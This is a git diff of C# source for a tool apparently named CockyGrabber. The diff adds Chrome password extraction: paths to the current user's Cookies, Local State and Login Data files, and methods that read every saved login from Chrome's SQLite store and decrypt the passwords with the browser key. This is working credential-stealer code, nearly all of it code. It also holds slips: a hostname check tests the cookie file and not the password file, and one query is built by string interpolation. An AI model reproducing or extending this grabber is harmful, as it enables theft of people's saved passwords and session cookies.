@@ -1,4 +1,5 @@
-﻿using Newtonsoft.Json.Linq;
+using CockyGrabber.Classes;
+using Newtonsoft.Json.Linq;
 using Org.BouncyCastle.Crypto;
 using Org.BouncyCastle.Crypto.Engines;
 using Org.BouncyCastle.Crypto.Modes;
@@ -20,9 +21,10 @@ namespace CockyGrabber
 {
     public class ChromeGrabber
     {
-        public const string ChromeCookiePath = @"C:\Users\User\AppData\Local\Google\Chrome\User Data\Default\Cookies";
-        public const string ChromeKeyPath = @"C:\Users\User\AppData\Local\Google\Chrome\User Data\Local State";
-        
+        public string ChromeCookiePath = @"C:\Users\" + Environment.UserName + @"\AppData\Local\Google\Chrome\User Data\Default\Cookies";
+        public string ChromeKeyPath = @"C:\Users\" + Environment.UserName + @"\AppData\Local\Google\Chrome\User Data\Local State";
+        public string ChromePasswordPath = @"C:\Users\" + Environment.UserName + @"\AppData\Local\Google\Chrome\User Data\Default\Login Data";
+
 
         /// <summary>
         /// Returns a value depending on if the File "Cookies" was found
@@ -34,6 +36,18 @@ namespace CockyGrabber
                 return true;
             return false;
         }
+
+        /// <summary>
+        /// Returns a value depending on if the File "Login Data" was found
+        /// </summary>
+        /// <returns>true if Cookies was found and false if not</returns>
+        public bool PasswordsExists()
+        {
+            if (File.Exists(ChromePasswordPath))
+                return true;
+            return false;
+        }
+
         /// <summary>
         /// Returns a value depending on if the File "Local State" was found
         /// </summary>
@@ -100,6 +114,62 @@ namespace CockyGrabber
                 conn.Close();
             }
             return cookies;
+        }
+
+        public List<Passwords> GetPasswordByHostname(string hostName, byte[] key)
+        {
+            List<Passwords> password = new List<Passwords>();
+            if (hostName == null) throw new ArgumentNullException("hostName"); // throw ArgumentNullException if hostName is null
+            if (!CookiesExists()) throw new FileNotFoundException("Cant find cookie store", ChromePasswordPath);  // throw FileNotFoundException if "Chrome\User Data\Default\Cookies" not found
+
+            using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={ChromePasswordPath};pooling=false"))
+            using (var cmd = conn.CreateCommand())
+            {
+                cmd.CommandText = $"SELECT origin_url,username_value,password_value FROM logins WHERE origin_url = '{hostName}'";
+
+                conn.Open();
+                using (var reader = cmd.ExecuteReader())
+                {
+                    while (reader.Read())
+                    {
+                        password.Add(new Passwords()
+                        {
+                            url = reader.GetString(0),
+                            password = DecryptWithKey((byte[])reader[2], key, 3),
+                            username = reader.GetString(1)
+                        });
+                    }
+                }
+                conn.Close();
+            }
+            return password;
+        }
+        public List<Passwords> GetAllPasswords(byte[] key)
+        {
+            List<Passwords> password = new List<Passwords>();
+            if (!PasswordsExists()) throw new FileNotFoundException("Cant find password store", ChromeCookiePath);  // throw FileNotFoundException if "Chrome\User Data\Default\Cookies" not found
+
+            using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={ChromePasswordPath};pooling=false"))
+            using (var cmd = conn.CreateCommand())
+            {
+                cmd.CommandText = $"SELECT origin_url,username_value,password_value FROM logins";
+
+                conn.Open();
+                using (var reader = cmd.ExecuteReader())
+                {
+                    while (reader.Read())
+                    {
+                        password.Add(new Passwords()
+                        {
+                            url = reader.GetString(0),
+                            password = DecryptWithKey((byte[])reader[2], key, 3),
+                            username = reader.GetString(1)
+                        });
+                    }
+                }
+                conn.Close();
+            }
+            return password;
         }
 
 
